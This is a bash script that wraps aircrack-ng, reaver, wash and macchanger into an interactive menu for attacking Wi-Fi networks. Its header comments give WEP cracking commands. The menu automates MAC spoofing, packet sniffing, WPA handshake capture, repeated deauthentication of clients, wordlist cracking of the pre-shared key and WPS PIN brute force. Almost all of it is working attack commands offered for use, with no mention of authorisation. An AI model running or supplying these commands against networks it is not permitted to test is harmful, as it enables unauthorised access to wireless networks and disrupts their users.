# Wireless Network Crack script # Base on arodump, airplay & aricrack 
# Require aircrack-ng, macchanger, reaver, wash

# Test On:
#	1.7.0
#	Aircrack-ng 1.3
#	Reaver v1.6.5
#	Wash v1.6.5

# Restart network interface:
# 	ifconfig <interface> down
#	ifconfig <interface> up

# Kill the baffling processes:
#	airmon-ng check kill

# Crack WEP:
#	airodump-ng --ivs -w xxx --bssid <AP BSSID> wlan0mon
#	aireplay-ng -1 0 -a <AP BSSID> wlan0mon
#	aireplay-ng -3 -b <AP BSSID> wlan0mon
#	aircrack-ng xxx.ivs

# Recovry password with your known PIN:
#	reaver -i <interface> -b <AP_MAC> -p <Your PIN> -vv

# See also:kj
#	vendor macaddress	http://standards-oui.ieee.org/oui/oui.txt



# Color sets

yellow="\033[33m"
red="\033[31m"
blue="\033[34m"
purple="\033[35m"
reset="\033[0m"

CURRENT_MAC=''

infoBoard(){
	echo "${yellow}"
	echo "-------------------------------------------------------------------"
	echo "|                   %%%%%%%%%%%%%%%%%%%%%%%%                      |"
	echo "|                   % Configure & Sniffing %                      |"
	echo "|                   %%%%%%%%%%%%%%%%%%%%%%%%                      |"
	echo "|                                                                 |"
	echo "|                     1) Spoof MAC Address                        |"
	echo "|                     2) Start Monitor Mode                       |"
	echo "|                     3) Stop Monitor Mode                        |"
	echo "|                     4) Sniff Wireless Network (WEP/WPA/WPA2)    |"
	echo "--------------------------------${reset}${red}-----------------------------------"
	echo "|                         %%%%%%%%%%%%                            |"
	echo "|                         % WPA/WPA2 %                            |"
	echo "|                         %%%%%%%%%%%%                            |"
	echo "|                                                                 |"
	echo "|            5) Wireless Packet Capture (Save as: 'BSSID'.cap)    |"
	echo "|            6) Deassociation Attack (deauth)                     |"
	echo "|            7) Wordlist Attack To Crack the PSK                  |"
	echo "--------------------------------${reset}${blue}-----------------------------------"
	echo "|                           %%%%%%%                               |"
	echo "|                           % WPS %                               |"
	echo "|                           %%%%%%%                               |"
	echo "|                                                                 |"
	echo "|                     8) Sniff WPS Network                        |"
	echo "|                     9) PIN Attack WPS                           |"
	echo "-------------------------------------------------------------------"
	echo "${reset}"
}

infoBoard

if [ $# -eq 1 ] ; then
	if [ "$1" = '-h' ] || [ "$1" = '--help' ]; then
		infoBoard
		exit
	elif [ "$1" ]; then
		opt="$1"
	fi
elif [ $# -eq 0 ] ; then
	echo "Choose you options:"
	read opt 
fi


case $opt in
1)
	echo
	echo "[*] Spoof MAC Address"
	echo "------------------------"
	iwconfig
	echo "[*] Which interface:";read inf
	ifconfig $inf down
	echo "[*] Specify your new mac (default: random mac)"; read new_mac
	if [ "$new_mac" ] ; then
		macchanger -m $new_mac $inf
	else
		macchanger -r $inf
	fi
	ifconfig $inf up
	#Check it again
	echo 
	macchanger -s $inf
;;
2)	
	echo
	echo "[*] Start Monitor Mode"
	echo "------------------------"
	iwconfig
	echo "[*] Which interface:";read inf
	airmon-ng start $inf
;;
3)
	echo
	echo "[*] Stop Monotor Mode"
	echo "------------------------"
	airmon-ng
	echo "[*] Which interface:";read inf
	airmon-ng stop $inf
	iwconfig
;;
4)
	echo
	echo "[*] Start airodump to sniff network using wep/wpa/wpa2"
	echo "--------------------------------------------------------"
	airmon-ng
	echo "[*] Which interface:";read inf
	airodump-ng $inf
;;
5)
	echo
	echo "[*] Packet Capture"
	echo "----------------------"
	airmon-ng
	echo "[*] Which interface:";read inf
	echo "[*] Which channel:";read ch
	echo "[*] Which AP BSSID:";read bssid
	echo "[*] Safe as:       (default: $bssid-01.cap)";read filename
	if [ "$filename" ];then
		airodump-ng $inf -c $ch --bssid $bssid -w $filename
	else
		airodump-ng $inf -c $ch --bssid $bssid -w $bssid
	fi
;;	
6)
	echo
	echo "[*] Deassociation Attack (default 2 deauth packet will be send)"
	echo "-----------------------------------------------------------------"
	airmon-ng
	echo "[*] which interface";read inf
	echo "[*] Which AP BSSID:";read bssid
	while :
	do
		echo "[*] Which Client MAC address (STATION)";read c_mac
		aireplay-ng --deauth 2 -a $bssid -c $c_mac $inf
		echo "[*] Do it again? [y|n]";read op
		if [ "$op" = "n" ]; then
			break
		fi
	done
;;
7)
	echo
	echo "[*] Wordlist Attack"
	echo "---------------------"
	echo "[*] Specify you handshake packet";read hp
	echo "[*] Specify you wordlist";read wl
	aircrack-ng -w $wl $hp
;;
8)
	echo
	echo "[*] Start to sniff WPS AP"
	echo "---------------------------"
	airmon-ng
	echo "[*] Which interface:";read inf
	wash -i $inf
;;
9)
	echo
	echo "[*] Crack WPS"
	echo "---------------"
	airmon-ng 	
	echo "[*] Which interface:";read inf
	echo "[*] Which channel:";read ch
	echo "[*] Which AP BSSID:";read bssid
	echo "[*] Set a signal strength level :  (low 1~3 high)";read level
	case $level in
	1)
		reaver -i $inf -b $bssid -S -vv -d0 -c $ch
	;;
	2)
		reaver -i $inf -b $bssid -S -vv -d2 -t 5 -c $ch
	;;
	3)
		reaver -i $inf -b $bssid -S -vv -d5 -c $ch
	;;
	*)
		echo "Invalid Setting!"
	;;
	esac
;;
*)
	echo "[-] Invalid Option!"
esac
